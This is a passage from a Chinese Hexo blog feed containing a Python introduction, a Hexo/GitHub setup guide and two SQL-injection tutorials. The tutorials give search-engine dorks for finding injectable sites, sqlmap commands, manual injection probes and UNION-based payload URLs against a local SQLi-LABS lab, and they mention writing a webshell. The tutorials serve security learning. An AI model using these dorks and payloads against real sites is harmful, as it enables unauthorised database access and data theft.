        <content type="html"><![CDATA[<p>人生苦短，我用Python。作为现在互联网中被各大培训机构炒到最热的编程语言，Python因他的核心宗旨简单明了深入人心，但真有那么神吗？其实未必，不过这里先卖个关子。</p><hr><h1 id="Python简介"><a href="#Python简介" class="headerlink" title="Python简介"></a>Python简介</h1><p>Python是一个被创始人荷兰人吉多·范罗苏姆（Guido von Rossum，后面都称呼他为Guido）苛刻到骨子里的编程语言。</p><p>自1989年圣诞节：Guido开始写Python语言的编译器，1994年1月：Python 1.0正式发布，2000年10月：Python 2.0发布，增加了完整的垃圾回收，提供了对Unicode的支持，Python的整个开发过程更加透明，生态圈开始慢慢形成，如日中天的时候，Python官方发现它还可以再简便、更好的适应未来的一些编码需求，就引入了诸多现代编程语言的新特性，发布了Python 3.0，这一次的大版本更新并不完全兼容之前的Python代码。</p><a id="more"></a><blockquote><p><strong>说明</strong>：大多数软件的版本号一般分为三段，形如A.B.C，其中A表示大版本号，当软件整体重写升级或出现不向后兼容的改变时，才会增加A；B表示功能更新，出现新功能时增加B；C表示小的改动（例如：修复了某个Bug），只要有修改就增加C。</p></blockquote><p>为了更好的理解python与其他编程语言相比之下的便利性，我们举个小例子</p><p>案例：设a=1,b=2交换a,b两个变量的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python代码</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">a,b = b,a</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Java代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> b = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> c = a;<span class="comment">//c作为中间变量临时寄存a里面的值</span></span><br><span class="line">        a = b;</span><br><span class="line">        b = c;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正是因为Python这些破釜沉舟的简化代码过程，所以它的优点很突出，简单明确，跟其他很多语言相比，Python更容易上手。目前Python在Web服务器应用开发、云基础设施开发、网络数据采集（爬虫）、数据分析、量化交易、机器学习、自动化测试、自动化运维等领域都有用武之地。</p><hr><h1 id="Python的环境安装"><a href="#Python的环境安装" class="headerlink" title="Python的环境安装"></a>Python的环境安装</h1><h2 id="运行环境安装"><a href="#运行环境安装" class="headerlink" title="运行环境安装"></a>运行环境安装</h2><p>在开启Python编程旅行之前，我们首先需要完成环境安装，否则将会无法运行它，推荐在官网下载</p><blockquote><p>下载官网：<a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a></p><p>注意：由于Python2.x与Python3.x并不互相兼容，而文档后续将会使用Python3的语法进行讲解</p></blockquote><p>由于Python安装教程真的太多了，这里只会使用Win10简单过一下</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200702103437275.png" alt="image-20200702103437275"></p><p>勾选红框初将其添加至系统环境变量(注意如果Python3不是主力环境需要安装双Python环境请不要勾选)</p><p>一路next至下图，红框处修改安装目录</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200702103623221.png" alt="image-20200702103623221"></p><p>等待安装完成后，win+r输入cmd打开命令提示符窗口，输入<code>python --version</code>  弹出版本信息即为安装完成</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200702103933257.png" alt="image-20200702103933257"></p><p>如果需要安装双Python环境，需要修改安装环境目录名，然后去修改环境变量Path值，将目录添加进去即可</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200702104104936.png" alt="image-20200702104104936"></p><p>然后重启cmd，之后Python3环境就需要输入<code>python3 --version</code> 进行打开了</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200702104210461.png" alt="image-20200702104210461"></p><h2 id="编辑环境安装"><a href="#编辑环境安装" class="headerlink" title="编辑环境安装"></a>编辑环境安装</h2><p>Python虽然是文本语言使用txt就可以编写，但是如果真的使用txt，遇到庞大代码量又确实…</p><p>这里我比较推荐大家使用的是Python宇宙开发神器pycharm</p><p>官网链接：<a href="https://www.jetbrains.com/pycharm/download/">https://www.jetbrains.com/pycharm/download/</a></p><p>注意：对于Python的web开发是需要pycharm专业版本的，不过这个也难不倒大家，学生可以直接凭借学生邮箱或者学信网的认证去官网领取一年的使用权，吾爱破解等网站也有很多大佬进行分享，为了省事，我在虚拟机系统中就直接安装2019年社区版了，专业版的安装的步骤和本次是相同的</p><p>双击打开pycharm-community-2019.3.1.exe</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200320112042878.png" alt="image-20200320112042878"></p><p>直接next，修改安装地址，同样不建议在C盘</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200320112149682.png" alt="image-20200320112149682"></p><p>修改地址后next</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200320112257556.png" alt="image-20200320112257556"></p><p>直接next</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200320112349855.png" alt="image-20200320112349855"></p><hr><h1 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h1><p>我们现在已经把环境给安装完成了，按照行业管理，我们需要写一行HelloWorld，来正式开启我们的Python学习之路。</p><p>由于代码很简单，所以这里就不使用重量级的编辑器Pycharm了，直接搜索打开idle(python解释器自带编辑器)</p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200702155815537.png" style="zoom:67%;" /><p>打开之后，该有的仪式感还是整一下，File-&gt;New File-&gt;输入代码<code>hello, world</code>-&gt;ctrl+s保存-&gt;然后点击Run或者F5进行运行</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200702161838960.png" alt="image-20200702161838960"></p><p>然后我们就能发现IDLE的Shell里面出现了</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200702162043737.png" alt="image-20200702162043737"></p><hr><h1 id="补充小知识"><a href="#补充小知识" class="headerlink" title="补充小知识"></a>补充小知识</h1><p>python程序使用缩进来判断代码级别，同一级别的代码会自上而下顺序执行，所以代码的缩进在python中就会显得尤为重要</p><p>python缩进认可是4个空格，因为windows的制表符就是四个空格，我们为了方便通常使用制表符来快速输入，可是在跨平台的过程中，有的平台的制表符不是四个空格，所以，我们需要进行一些设置，将pycharm的制表符设置为4个空格来输入</p><h2 id="打开选项菜单"><a href="#打开选项菜单" class="headerlink" title="打开选项菜单"></a>打开选项菜单</h2><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200830120658761.png" alt="image-20200830120658761"></p><h2 id="修改为4个空格"><a href="#修改为4个空格" class="headerlink" title="修改为4个空格"></a>修改为4个空格</h2><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200830121010555.png" alt="image-20200830121010555"></p>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2.SQL注入流程和注入相关常用函数</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/2.SQL%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/2.SQL%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>在对SQL注入原理有了一定基本了解之后，我们需要想办法来找到SQL注入漏洞</p><a id="more"></a><hr><h1 id="寻找SQL注入点"><a href="#寻找SQL注入点" class="headerlink" title="寻找SQL注入点"></a>寻找SQL注入点</h1><p>只有发现了SQL注入点，我们才能通过掌握的方法获取我们想要的数据</p><h2 id="目标搜集"><a href="#目标搜集" class="headerlink" title="目标搜集"></a>目标搜集</h2><h3 id="无特定目标"><a href="#无特定目标" class="headerlink" title="无特定目标"></a>无特定目标</h3><p>没有一个明确的目标，可以使用搜索引擎对互联网中的目标进行一个广泛搜索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:.php?id&#x3D;</span><br></pre></td></tr></table></figure><h3 id="有特定目标"><a href="#有特定目标" class="headerlink" title="有特定目标"></a>有特定目标</h3><p>有特定目标使用搜索引擎查找可能注入点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:.php?id&#x3D;site:目标网站url</span><br></pre></td></tr></table></figure><p>在进行浏览器搜索的时候，并非一定会是.php也并非一定是id参数</p><h3 id="工具爬取"><a href="#工具爬取" class="headerlink" title="工具爬取"></a>工具爬取</h3><p>spider，对搜索引擎和目标网址进行爬取</p><h2 id="注入识别"><a href="#注入识别" class="headerlink" title="注入识别"></a>注入识别</h2><h3 id="手工简单识别"><a href="#手工简单识别" class="headerlink" title="手工简单识别"></a>手工简单识别</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">’#查看是否报错，初步判断是否存在注入漏洞</span><br><span class="line">and 1&#x3D;1 &#x2F; and 1&#x3D;2#1&#x3D;1正常输出页面1&#x3D;2报错，初步判断有漏洞</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1 &#x2F; and &#39;1&#39;&#x3D;&#39;2#在上文基础上尝试闭合</span><br><span class="line">and 1 like 1 &#x2F; and 1 like 2</span><br></pre></td></tr></table></figure><h3 id="工具识别"><a href="#工具识别" class="headerlink" title="工具识别"></a>工具识别</h3><p>工具主要使用sqlmap</p><p>简单识别：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -m filename(filename中保存检测目标)</span><br><span class="line">sqlmap --crawl(sqlmap对目标网站进行爬取，依次进行测试)</span><br></pre></td></tr></table></figure><p>高级识别:</p><p>我们最常对get或者post请求进行sql注入测试，但其实header头中的例如cookie有时也会存在注入漏洞，这时候需要增加测试级别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">扩展识别广度和深度:</span><br><span class="line">SqlMap --level 增加测试级别，对header中相关参数也进行测试</span><br><span class="line">sqImapr -r filename（filename中为网站请求数据）</span><br></pre></td></tr></table></figure><p>利用工具提高识别效率，BurpSuite+SqlMap，使用BurpSuite拦截所有浏览器访问提交的数据，BurpSuite扩展插件，直接调用SqlMap进行测试</p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200628173128827.png" alt="image-20200628173128827" style="zoom:50%;" /><blockquote><p>一些Tips:<br>可以在参数后键入*来确定想要测试的参数，可能出现注入的点:新闻、登录、搜索、留言…站在开发的角度去寻找</p></blockquote><p>burp抓包获取http请求之后，保存请求为txt文件，在监测点加*号，sqlmap就只对id进行的注入点进行测试</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200628173912524.png" alt="image-20200628173912524"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r C:\Users\kinght\Desktop\1.txt</span><br></pre></td></tr></table></figure><p>注意：我这里的sqlmap并没有使用burp的插件，burp的sqlmap插件不支持python3</p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>代码审计在后面会专门做笔记，这里只是简单提一下</p><hr><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h2><p>报错页面很多时候就能显示数据库类型</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200706144929788.png" alt="image-20200706144929788"></p><h2 id="数据库版本"><a href="#数据库版本" class="headerlink" title="数据库版本"></a>数据库版本</h2><p>可以通过<code>version()</code>和<code>@@version</code>判断数据库版本</p><h2 id="数据库用户"><a href="#数据库用户" class="headerlink" title="数据库用户"></a>数据库用户</h2><p>可以通过<code>user()</code>和<code>SYSTEM_USER</code>获取数据库用户</p><h2 id="数据库权限"><a href="#数据库权限" class="headerlink" title="数据库权限"></a>数据库权限</h2><p>可以通过<code>super_priv</code>和<code>IS_SRVROLEMEMBER</code>获取数据库权限</p><h2 id="获取数据库数据"><a href="#获取数据库数据" class="headerlink" title="获取数据库数据"></a>获取数据库数据</h2><p>然后通过语句查询和暴力破解获取库信息、表信息、列信息、数据信息</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>在Mysql5.0版本之后，Mysql默认在数据库中存放一个<code>information_schema</code>的数据库，在该库中有三个默认表名，分别是SCHEMATA、TABLES、COLUMNS</p><h3 id="SCHEMATA"><a href="#SCHEMATA" class="headerlink" title="SCHEMATA"></a>SCHEMATA</h3><p>SCHEMATA表存储了该用户创建的所有数据库的库名，查询数据库库名的字段是SCHEMA_NAME</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SCHEMA_NAME from SCHEMATA</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201014204747870.png" alt="image-20201014204747870"></p><h3 id="TABLES"><a href="#TABLES" class="headerlink" title="TABLES"></a>TABLES</h3><p>TABLES表存储该用户创建的所有数据库的库名和表明，而记录数据库库名的字段为TABLE_SCHEMA，记录表名的字段为TABLE_NAME</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select TABLE_SCHEMA,TABLE_NAME from TABLES;</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201014204634954.png" alt="image-20201014204634954"></p><h3 id="COLUMNS"><a href="#COLUMNS" class="headerlink" title="COLUMNS"></a>COLUMNS</h3><p>COLUMNS表存储了该用户创建的所有数据库的库名、表名和字段名分别为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME from columns;</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201014205245981.png" alt="image-20201014205245981"></p><hr><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>完成信息搜集和数据获取后，就要想办法进行权限提升</p><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><p>SQLSever sa权限</p><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>读取中间件配置文件、数据库配置文件</p><h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>写WebShell到网站目录</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1.SQL注入基础</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/1.SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/1.SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>在1998年12月的《Phack》第54期，名为rfp的黑客发表了一篇名为“NT Webs Technology Vulnerabilities”的文章，随后一种在OWASP TOP10排行榜霸榜多年名为SQL注入的漏洞来到了世人的眼前</p><blockquote><p>原文地址：<a href="http://phrack.org/issues/54/8.html">http://phrack.org/issues/54/8.html</a></p></blockquote><a id="more"></a><hr><h1 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h1><h2 id="SQL语言介绍"><a href="#SQL语言介绍" class="headerlink" title="SQL语言介绍"></a>SQL语言介绍</h2><p>SQL全称是“结构化查询语言”，最早是IBM为关系数据库系统SYSTEMR开发的一种查询语言，SQL语言结构简洁，功能强大，简单易学，所以IBM于1981年推出后得到了广泛的应用。</p><p>结构化查询语言SQL是一种介于关系代数与关系演算之间的语言，其功能包含查询、操纵、定义和控制，是一个通用功能极强的关系数据库标准语言</p><h2 id="SQL注入产生原因"><a href="#SQL注入产生原因" class="headerlink" title="SQL注入产生原因"></a>SQL注入产生原因</h2><p>由于B/S模式随着互联网的高速发展，被应用的越来越广泛，而开发人员水平和经验参差不齐，在编写代码的时候没有对用户的输入数据或页面中所携带的信息进行必要的合法性判断，攻击者利用这个机会提交一段数据库查询代码，根据程序返回结果即可获得部分数据库信息</p><h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p>SQL注入是一种将恶意的SQL代码插入或添加到应用(用户)的输入输出的攻击手段，攻击者探测出开发者编程过程中的漏洞，利用这些漏洞构造SQL语句，对数据库内容进行直接的检索或修改</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200625140542821.png" alt="image-20200625140542821"></p><p>灵活的SQL查询语句+用户输入的数据代入了SQL语句=用户操作数据库-&gt;SQL注入漏洞</p><h3 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h3><blockquote><p>SQLi-LABS源码：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p></blockquote><p>PHP环境安装SQLi-LABS，并且打开SQLi-LABS的数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show databases;#显示已有数据库</span><br><span class="line">use security;#进入SQLi-LABS的数据库security</span><br><span class="line">show tables;#查看已有数据表</span><br><span class="line">select * from users;#查看数据表users所有内容</span><br><span class="line">select username,password from users where id&#x3D;1;#查看数据表users中id&#x3D;1的username,password列内容</span><br><span class="line">select version();#使用内置函数version()查看数据库版本</span><br></pre></td></tr></table></figure><p>在注入中有一个函数叫做union，作用是联合查询，常被用于数据库注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from users where id&#x3D;1 union select 1,version();</span><br></pre></td></tr></table></figure><p>这里需要注意的是，我们要符合列数对应，两列内容必须对应两列，否则就会报错</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200628002147578.png" alt="image-20200628002147578"></p><p>所以我们这里添加单独查询1(查询1会直接返回1)来占位，结果第一行返回了id=1的username,password和第二行返回了查询1的结果和mysql版本号</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200628003033628.png" alt="image-20200628003033628"></p><p>为了更直观的演示，我们打开SQLi-LABS    Less-1的index.php，直接跳转到20行与29行</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200628005128225.png" alt="image-20200628005128225"></p><p>我们发现在20行获取了传入id之后，没有经过任何的处理，就直接把放进了sql语句中进行应用，并且在33行开始返回结果</p><p>如果我们正常传入数字id的话，将会输出id所对应的username和password的值</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200628094046738.png" alt="image-20200628094046738"></p><p>limit 0,1指的是从第0条开始返回一条记录</p><p>我们现在已知传入时候代码会被无过滤的放到id=的后面，所以我们构造一个联合查询，查询版本号，同时将’ limit 0,1使用注释符注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;&#39;1&#39; union select version(),1,2;#&#39; limit 0,1;</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200628100611206.png" alt="image-20200628100611206"></p><p>我们在浏览器中构造url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1%27%20union%20select%20version(),1,2;%23</span><br></pre></td></tr></table></figure><p>因为#通常会用在编码中，所以直接使用#会报错，%23是#的编码</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200628101556676.png" alt="image-20200628101556676"></p><p>我们发现语句被正常执行了，但是由于网页输出只输出一行的原因没能被输出出来</p><p>那我们就让第一行报错，报错就不执行了，而且数据库第一列是id，网页中也是不输出的，所以我们把他version()和1换个位置</p><p>重新构造URL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,version(),2;%23</span><br></pre></td></tr></table></figure><p>输出成功</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200628101926282.png" alt="image-20200628101926282"></p><p>大致流程如下图</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200627173107083.png" alt="image-20200627173107083"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0.Hexo+GetHub搭建博客系统</title>
      <link href="%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/hexo%E7%9B%B8%E5%85%B3/%E8%BF%90%E7%BB%B4%E7%9B%B8%E5%85%B3/hexo/0.Hexo+GetHub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/"/>
      <url>%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/hexo%E7%9B%B8%E5%85%B3/%E8%BF%90%E7%BB%B4%E7%9B%B8%E5%85%B3/hexo/0.Hexo+GetHub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="本文配置环境"><a href="#本文配置环境" class="headerlink" title="本文配置环境"></a>本文配置环境</h1><p>系统：win10+Node.js+Git</p><p>博客系统：Hexo+next</p><p>书写系统：Typora+PicGo+腾讯云Cos</p><a id="more"></a><hr><h1 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h1><p>Node.js：<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a></p><p>Git：<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></p><p>这两款软件属于傻瓜式安装，注意修改安装地址即可，在此不做过多叙述</p><hr><h1 id="博客系统"><a href="#博客系统" class="headerlink" title="博客系统"></a>博客系统</h1><h2 id="搭建hexo"><a href="#搭建hexo" class="headerlink" title="搭建hexo"></a>搭建hexo</h2><p><code>Win+R</code>打开运行窗口输入cmd，执行命令下载hexo系统：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/Cm0OC6KyMU7yLdTl.png!thumbnail" alt="图片"></p><p>切换到准备放博客的目录，创建博客：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init &#x2F;&#x2F;hexo初始化</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/Lmx0L7rggLHhwFUV.png!thumbnail" alt="图片"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g &#x2F;&#x2F;hexo更新本地缓存</span><br><span class="line">hexo s &#x2F;&#x2F;hexo本地预览</span><br></pre></td></tr></table></figure><p>在本地浏览器输入<a href="http://localhost:4000/">http://localhost:4000/</a><br><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/VR18AfEBavKdmtt5.png!thumbnail" alt="图片"></p><h2 id="注册Github"><a href="#注册Github" class="headerlink" title="注册Github"></a>注册Github</h2><p>Github官网：<a href="http://www.github.com/">www.github.com</a>，自行注册账号</p><h2 id="创建github博客空间"><a href="#创建github博客空间" class="headerlink" title="创建github博客空间"></a>创建github博客空间</h2><p>注册完账号后右上角有一个加号，点开新建一个仓库</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/EAmovcM1vvqOFo8X.png!thumbnail" alt="图片"></p><p>设置仓库名为账号名.github.io</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/a8abtSfiYYUtB3UV.png!thumbnail" alt="图片"></p><p>点击Create repository完成创建</p><h2 id="配置Git密钥"><a href="#配置Git密钥" class="headerlink" title="配置Git密钥"></a>配置Git密钥</h2><p>SSH秘钥默认储存在账户的主目录下的~/.ssh目录</p><blockquote><p>如：C:\Users\kinght.ssh\</p></blockquote><p>查看是否包含id_rsa和id_rsa.pub(或者是id_dsa和id_dsa.pub之类成对的文件)，有.pub后缀的文件就是公钥，另一个文件则是密钥。如果有这两个文件，则跳过1.2；如果没有这两个文件，甚至.ssh目录也没有，则需要用ssh-keygen来创建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;邮箱&quot;</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/FSdU9uCbrSrWqsD4.png!thumbnail" alt="图片"></p><p>连续几个回车之后就会如图所示，在.ssh文件夹中出现了两个文件</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/bReK8DlVQUbiPxZ6.png!thumbnail" alt="图片"></p><p>回到github官网，找到自己的头像进入settings</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/xaj7Ool9XoZIylKy.png!thumbnail" alt="图片"></p><p>SSH and GPG keys -&gt; SSH keys -&gt; New SSH key</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/B6b5CjYFpY7m1Ieo.png!thumbnail" alt="图片"></p><p>回到本地的ssh文件，用记事本打开id_rsa.pub文件，复制里面内容填写到密钥框里<img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/Sn6KnOyDKaTsBYz7.png!thumbnail" alt="图片"></p><p>Title随意填，把id_rsa.pub文件，复制里面内容填写到Key框里，点击Add SSH key保存</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/lSRhzM4q7L8oFnyt.png!thumbnail" alt="图片"></p><h2 id="安装hexo-deployer-git插件"><a href="#安装hexo-deployer-git插件" class="headerlink" title="安装hexo-deployer-git插件"></a>安装hexo-deployer-git插件</h2><p>为了使用github的免费静态空间，我们需要把Hexo生成的静态页面上传到github供我们访问，在这之前，需要使用hexo-deployer-git插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 